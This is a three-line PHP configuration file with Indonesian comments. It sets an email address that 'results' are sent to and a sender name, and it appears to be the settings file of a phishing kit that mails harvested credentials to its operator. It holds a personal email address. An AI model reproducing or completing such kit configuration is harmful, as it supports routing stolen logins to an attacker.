<?php
$emailku = 'rafiexohox@gmail.com'; // email tujuan utntuk dikirim result //
$pengirim = 'RAFIEAF.COM'; // nama yg muncul di result sebagai pengirim //
?>